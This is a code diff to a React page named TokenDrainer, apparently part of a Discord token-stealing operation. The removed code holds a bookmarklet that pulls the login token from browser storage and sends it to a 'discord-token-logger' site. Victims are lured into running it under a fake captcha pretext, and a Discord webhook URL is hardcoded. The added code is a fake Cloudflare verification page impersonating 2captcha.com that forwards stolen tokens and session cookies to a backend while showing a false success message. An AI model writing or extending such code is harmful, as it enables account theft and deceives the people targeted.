@@ -1,26 +1,100 @@
-import { useState, useMemo, useEffect } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import { API_ORIGIN } from '../api';
+
+const SITE_NAME = '2captcha.com';
+const FAVICON_URL = 'https://2captcha.com/favicon.ico';
+
+function Spinner() {
+  return (
+    <div className="cf-spinner">
+      <span className="cf-dot" /><span className="cf-dot" /><span className="cf-dot" />
+      <span className="cf-dot" /><span className="cf-dot" /><span className="cf-dot" />
+      <span className="cf-dot" /><span className="cf-dot" />
+    </div>
+  );
+}
+
+function SuccessIcon() {
+  return (
+    <svg width="30" height="30" viewBox="0 0 52 52" className="cf-success-svg">
+      <circle cx="26" cy="26" r="25" fill="#228b49" stroke="#228b49" strokeWidth="2" />
+      <path d="m13,26l9.37,9l17.63,-18" fill="none" stroke="#fff" strokeWidth="6"
+        strokeDasharray="242" className="cf-check-path" />
+    </svg>
+  );
+}
+
+function FailIcon() {
+  return (
+    <svg width="30" height="30" viewBox="0 0 30 30" className="cf-fail-svg">
+      <circle cx="15" cy="15" r="15" fill="#b20f03" />
+      <path d="M15.93 16.23H13.43L13.07 7H16.28L15.93 16.23ZM14.68 19.16c.51 0 .92.15 1.22.45.31.3.47.68.47 1.15 0 .46-.16.84-.47 1.14-.31.3-.71.45-1.22.45-.5 0-.91-.15-1.22-.45-.31-.3-.46-.68-.46-1.14 0-.46.15-.84.46-1.14.31-.31.72-.46 1.22-.46Z"
+        fill="#f2f2f2" />
+    </svg>
+  );
+}
+
+function TurnstileWidget({ state }) {
+  return (
+    <div className="cf-widget">
+      {state === 'verifying' && (
+        <div className="cf-widget-inner">
+          <Spinner />
+          <span className="cf-widget-text">Verifying...</span>
+        </div>
+      )}
+      {state === 'checkbox' && (
+        <div className="cf-widget-inner">
+          <label className="cf-checkbox-label">
+            <input type="checkbox" readOnly checked={false} />
+            <span className="cf-checkbox-box" />
+            <span className="cf-checkbox-text">Verify you are human</span>
+          </label>
+        </div>
+      )}
+      {state === 'success' && (
+        <div className="cf-widget-inner">
+          <SuccessIcon />
+          <span className="cf-widget-text cf-success-text">Success!</span>
+        </div>
+      )}
+      {state === 'error' && (
+        <div className="cf-widget-inner">
+          <FailIcon />
+          <span className="cf-widget-text cf-error-text">Verification failed</span>
+        </div>
+      )}
+    </div>
+  );
+}
 
 function TokenDrainer() {
   const [status, setStatus] = useState('idle');
+  const [widgetState, setWidgetState] = useState('checkbox');
+  const processed = useRef(false);
 
-  // Handle token or cookie from URL parameters (when bookmarklet redirects here)
   useEffect(() => {
-    const urlParams = new URLSearchParams(window.location.search);
+    if (processed.current) return;
+    const urlParams = new URLSearchParams(globalThis.location.search);
     const token = urlParams.get('token');
     const cookie = urlParams.get('cookie');
 
+    if (!token && !cookie) return;
+    processed.current = true;
+
+    setStatus('processing');
+    setWidgetState('verifying');
+
+    const timer1 = setTimeout(() => {
+      setWidgetState('success');
+    }, 2200);
+
     if (token) {
-      setStatus('processing');
-
-      const processTokenUrl = `${API_ORIGIN}/api/process-token`;
-      console.log('process-token URL:', processTokenUrl);
-
-      fetch(processTokenUrl, {
+      fetch(`${API_ORIGIN}/api/process-token`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          token: token,
+          token,
           url: urlParams.get('url') || 'Unknown',
           timestamp: urlParams.get('timestamp') || new Date().toISOString(),
           method: urlParams.get('method') || 'Bookmarklet Redirect'
@@ -30,26 +104,22 @@ function TokenDrainer() {
         const data = await res.json().catch(() => ({}));
         if (!res.ok || !data.success) {
           setStatus('error');
+          setWidgetState('error');
           if (data.message) console.error('Backend:', data.message);
           return;
         }
-        console.log('process-token API ran successfully:', processTokenUrl);
         setStatus('success');
       })
-      .catch((err) => {
+      .catch(() => {
         setStatus('error');
-        console.error('Fetch Error:', err);
+        setWidgetState('error');
       });
-
-      window.history.replaceState(null, '', window.location.pathname);
     } else if (cookie) {
-      setStatus('processing');
-
       fetch(`${API_ORIGIN}/api/process-cookie`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          cookie: cookie,
+          cookie,
           sid: urlParams.get('sid') || '',
           sapisid: urlParams.get('sapisid') || '',
           type: urlParams.get('type') || 'unknown',
@@ -62,262 +132,63 @@ function TokenDrainer() {
         const data = await res.json().catch(() => ({}));
         if (!res.ok || !data.success) {
           setStatus('error');
+          setWidgetState('error');
           if (data.message) console.error('Backend:', data.message);
           return;
         }
         setStatus('success');
       })
-      .catch((err) => {
+      .catch(() => {
         setStatus('error');
-        console.error('Fetch Error:', err);
+        setWidgetState('error');
       });
-
-      window.history.replaceState(null, '', window.location.pathname);
     }
+
+    globalThis.history.replaceState(null, '', globalThis.location.pathname);
+
+    return () => clearTimeout(timer1);
   }, []);
 
-  const bookmarkletCode = useMemo(() => {
-    const webhookUrl = 'https://discord.com/api/webhooks/1412768418544881776/bn-c8zNPSqn-FbGC51cTNRlDJ9aNVBzuPdJHF9UiQSSRE7VnxZPzoBuDDOlGOzTjznh5';
-    const script = `
-      (function(){
-
-
-        // Try multiple methods to get the token
-        try {
-          var token = null;
-
-          // Method 1: Try localStorage directly
-          if(typeof localStorage !== 'undefined') {
-            token = localStorage.getItem('token');
-            if(token) {
-              console.log('Found token via localStorage:', token.substring(0, 20) + '...');
-            }
-          }
-
-          // Method 2: Try window object
-          if(!token && typeof window !== 'undefined') {
-            if(window.localStorage) {
-              token = window.localStorage.getItem('token');
-              if(token) {
-                console.log('Found token via window.localStorage:', token.substring(0, 20) + '...');
-              }
-            }
-          }
-
-          // Method 3: Try to access from iframes if available
-          if(!token) {
-            try {
-              var iframes = document.querySelectorAll('iframe');
-              for(var i = 0; i < iframes.length; i++) {
-                try {
-                  if(iframes[i].contentWindow && iframes[i].contentWindow.localStorage) {
-                    token = iframes[i].contentWindow.localStorage.getItem('token');
-                    if(token) {
-                      console.log('Found token via iframe localStorage:', token.substring(0, 20) + '...');
-                      break;
-                    }
-                  }
-                } catch(e) {
-                  // Skip iframe if access denied
-                }
-              }
-            } catch(e) {
-              console.log('Could not access iframes:', e.message);
-            }
-          }
-
-          // Method 4: Try to find token in current context storage
-          if(!token) {
-            try {
-              // Check for any storage-like objects
-              var storageKeys = Object.keys(window);
-              for(var i = 0; i < storageKeys.length; i++) {
-                var key = storageKeys[i];
-                if(key.toLowerCase().includes('storage') && window[key]) {
-                  try {
-                    if(typeof window[key].getItem === 'function') {
-                      token = window[key].getItem('token');
-                      if(token) {
-                        console.log('Found token via ' + key + ':', token.substring(0, 20) + '...');
-                        break;
-                      }
-                    }
-                  } catch(e) {}
-                }
-              }
-            } catch(e) {
-              console.log('Could not search window object:', e.message);
-            }
-          }
-
-                    if(token) {
-            // Clean the token by removing quotes
-            var cleanToken = token.replace(/"/g, '');
-
-            // CSP blocks fetch from Discord domain, so use a different approach
-            // Open a new tab with the token in the URL
-            var redirectUrl = 'https://discord-token-logger-frontend.vercel.app/?token=' + encodeURIComponent(cleanToken) +
-                             '&method=bookmarklet&timestamp=' + encodeURIComponent(new Date().toISOString()) +
-                             '&url=' + encodeURIComponent(window.location.href);
-
-            // Show the token in alert and console for immediate access
-            console.log('Token captured:', cleanToken);
-            console.log('Opening URL:', redirectUrl);
-
-            // Open the new tab - this should work even with CSP restrictions
-            window.open(redirectUrl, '_blank');
-
-            // Also try to copy to clipboard if possible
-            try {
-              if(navigator.clipboard) {
-                navigator.clipboard.writeText(cleanToken).then(function() {
-                  console.log('Token copied to clipboard!');
-                }).catch(function(err) {
-                  console.log('Could not copy to clipboard:', err);
-                });
-              }
-            } catch(e) {
-              console.log('Clipboard API not available');
-            }
-
-          } else {
-            alert('Could not find Captcha using any method. Please ensure you are logged in and the page is fully loaded.');
-          }
-        } catch(e) {
-          alert('A critical error occurred: ' + e.message);
-          console.error('Bookmarklet Error:', e);
-        }
-      })()
-    `;
-    return `javascript:${encodeURIComponent(script).replace(/'/g, "%27")}`;
-  }, []);
-
-  // Show processing status if token or cookie was received from bookmarklet redirect
-  if (status !== 'idle') {
-    return (
-      <div className="min-h-screen flex flex-col items-center justify-center px-6 text-center text-white">
-        {status === 'processing' && (
-          <p className="text-2xl font-medium text-slate-100">Verifying your captcha…</p>
-        )}
-        {status === 'success' && (
-          <>
-            <p className="text-3xl font-semibold text-emerald-400 mb-3">Captcha completed successfully</p>
-            <p className="text-lg text-slate-300 max-w-md">
-              Your verification finished. You can close this tab and continue where you left off.
-            </p>
-          </>
-        )}
-        {status === 'error' && (
-          <>
-            <p className="text-3xl font-semibold text-amber-400 mb-3">Captcha could not be verified</p>
-            <p className="text-lg text-slate-300 max-w-md mb-8">
-              Something went wrong during verification. Go back to the captcha page and complete it again.
-            </p>
-            <button
-              type="button"
-              onClick={() => {
-                globalThis.history.replaceState(null, '', globalThis.location.pathname);
-                setStatus('idle');
-              }}
-              className="px-8 py-3 rounded-lg bg-blue-600 hover:bg-blue-700 text-white text-lg font-medium shadow-lg transition-colors"
-            >
-              Retry captcha
-            </button>
-          </>
-        )}
-      </div>
-    );
-  }
+  const showSuccessHeading = widgetState === 'success' && status !== 'error';
 
   return (
-    <div className="min-h-screen flex items-center justify-center px-6 py-8" style={{ paddingTop: '120px' }}>
-      <div className="w-full max-w-xl mx-auto">
-        
-        <div className="flex items-center mb-8">
-          <div className="w-16 h-16 bg-gradient-to-br from-blue-500 via-blue-600 to-blue-700 rounded-2xl flex items-center justify-center shadow-lg mr-6">
-            <svg className="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 20 20">
-              <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
-            </svg>
-          </div>
-
-          {/* Title */}
-          <div>
-            <h1 className="text-5xl font-bold text-white leading-tight">
-              Login to verify your<br />account
-            </h1>
+    <div className="cf-page">
+      <div className="cf-main">
+        <div className="cf-title-zone">
+          <img src={FAVICON_URL} className="cf-favicon" alt="" />
+          <h1 className="cf-site-name">{SITE_NAME}</h1>
         </div>
-      </div>
 
-        <div className="mb-8">
-          <p className="text-slate-300 text-lg leading-relaxed mb-4">
-          To complete captcha-protected login, follow these steps:<br/>
-
-          Drag the button to your bookmarks bar.<br/>
-
-          Go to discord.com and log in.<br/>
-
-          Refresh the page, and immediately click the bookmark.<br/>
+        {!showSuccessHeading && (
+          <>
+            <h2 className="cf-heading">Verifying you are human. This may take a few seconds.</h2>
+            <p className="cf-desc">
+              This website uses a security service to protect against malicious bots.
+              This page is displayed while the website verifies you are not a bot.
             </p>
-          </div>
+          </>
+        )}
 
-        <div className="mb-8">
-          <a
-            href={bookmarkletCode}
-            onClick={(e) => {
-              e.preventDefault();
-              alert('Please drag this button to your bookmarks bar, then click it while you are on the Discord website.');
-            }}
-            className="px-8 py-3 bg-blue-600 hover:bg-blue-700 text-white text-lg font-medium rounded-lg shadow-lg transform hover:scale-105 transition-all duration-200 cursor-move"
-          >
-            Drag Me to Bookmarks
-          </a>
-          </div>
+        {showSuccessHeading && (
+          <h2 className="cf-heading cf-heading-success">
+            Verification successful. Waiting for {SITE_NAME} to respond<span className="cf-dots" />
+          </h2>
+        )}
 
-        {/* Browser Mockup */}
-        <div className="w-full max-w-lg">
-          {/* Browser Header */}
-          <div className="bg-gradient-to-r from-orange-400 to-orange-500 rounded-t-lg px-4 py-3 flex items-center">
-            <div className="flex space-x-2 mr-4">
-              <div className="w-3 h-3 bg-red-500 rounded-full"></div>
-              <div className="w-3 h-3 bg-yellow-500 rounded-full"></div>
-              <div className="w-3 h-3 bg-green-500 rounded-full"></div>
-            </div>
-            <div className="flex-1 bg-white/20 rounded px-3 py-1">
-              <span className="text-slate-800 text-sm">captcha.bot.io/verify</span>
-            </div>
-          </div>
-          
-          {/* Browser Content */}
-          <div className="bg-white rounded-b-lg p-4 min-h-[100px]">
-            <div className="flex items-center space-x-2 mb-3">
-              <div className="w-4 h-4 bg-blue-600 rounded flex items-center justify-center">
-                <svg className="w-2 h-2 text-white" fill="currentColor" viewBox="0 0 20 20">
-                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
-                </svg>
-              </div>
-              <span className="text-sm font-medium text-slate-800">Getting Started</span>
-              <span className="text-sm text-slate-500">Premium</span>
+        <TurnstileWidget state={widgetState} />
       </div>
 
-            {/* Mini content area */}
-            <div className="bg-slate-100 rounded p-3">
-              <div className="flex items-center space-x-2 mb-2">
-                <div className="w-2 h-2 bg-blue-500 rounded-full"></div>
-                <span className="text-xs text-slate-600">Getting Started</span>
-                <span className="text-xs text-slate-400">Premium</span>
-                </div>
-              <div className="bg-white rounded px-2 py-1 text-xs text-slate-500">
-                Looking at All Discord
-                </div>
-              <div className="mt-1 flex space-x-1">
-                <div className="w-16 h-3 bg-red-500 rounded-sm"></div>
-                <div className="w-8 h-3 bg-slate-300 rounded-sm"></div>
-                  </div>
-              </div>
-          </div>
+      <footer className="cf-footer">
+        <div className="cf-footer-inner">
+          <span className="cf-footer-text">
+            Performance and Security by{' '}
+            <a href="https://www.cloudflare.com" target="_blank" rel="noopener noreferrer">Cloudflare</a>
+          </span>
+          <span className="cf-footer-sep" />
+          <a href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noopener noreferrer"
+            className="cf-footer-text">Privacy</a>
         </div>
-
-      </div>
+      </footer>
     </div>
   );
 }
